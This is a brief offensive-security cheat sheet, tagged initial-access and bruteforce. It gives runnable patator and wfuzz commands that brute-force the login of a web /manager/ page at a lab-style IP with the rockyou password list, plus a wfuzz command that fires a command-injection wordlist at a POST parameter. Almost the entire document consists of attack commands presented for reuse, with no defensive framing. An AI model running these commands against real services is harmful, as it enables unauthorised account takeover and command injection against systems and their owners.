---
title: Patator / Wfuzz Login Bruteforce
category: initial-access
subcategory: bruteforce
os: linux
command: patator http_fuzz url=target user_pass=user:FILE0
tools: patator, wfuzz
---


### Patator HTTP fuzz

```bash
patator http_fuzz url=http://10.10.147.218:1234/manager/ method=GET user_pass=bob:FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:code=401
```

### Wfuzz POST login bruteforce

```bash
wfuzz -c -w /usr/share/wordlists/rockyou.txt -u http://10.10.147.218:1234/manager/ -d "j_username=bob&j_password=FUZZ"
```

### Wfuzz POST command-injection style

```bash
wfuzz -c -z file,/usr/share/wordlists/Fuzzing/command-injection.txt -d "postParameter=FUZZ" "$URL"
```
